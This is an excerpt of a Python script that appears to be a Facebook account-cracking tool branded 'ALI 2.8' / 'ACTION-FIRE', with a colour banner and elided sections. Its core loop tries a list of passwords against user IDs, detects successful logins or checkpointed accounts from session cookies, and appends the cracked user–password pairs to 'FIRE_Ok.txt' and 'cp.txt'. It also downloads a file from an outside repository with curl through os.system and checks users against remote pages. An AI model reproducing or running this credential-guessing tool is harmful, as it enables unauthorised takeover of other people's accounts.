...
from random import randint
r1=requests.get("https://github.com/ACTION-FIRE/File1/blob/main/ApprovemXD.txt").text
...
if not os.path.isfile('.agents.txt'):
	os.system('curl -L https://github.com/ACTION-FIRE/King.py.git/files/main/.agents.txt > .agents.txt')
ct = datetime.now()
n = ct.month
...
def main():
	...
	print('\033[1;32m        ┌─────────────────────────────────┐') 
	print("\033[1;92m\t│\033[1;92mWELLCOME TO ALI 2.8     \033[1;92m      │")
	print('\033[1;32m┌────────────────────────────────────────────┐') 
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('FIRE_Ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;31mFIRE-CP\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('cp.txt','a').write('%s\n' % wrt)
				break
...
class load:
	def __init__(self):
		...
		print('\n')
banner = """   
    ___   ____________________  _   __      ______________  ______
   /   | / ____/_  __/  _/ __ \/ | / /     / ____/  _/ __ \/ ____/
  / /| |/ /     / /  / // / / /  |/ /_____/ /_   / // /_/ / __/   
...
def xoshnaw():
	...
	try:
		httpCaht = requests.get("https://chat.whatsapp.com/GPDGICGLM7HGL1").text
		if id in httpCaht:
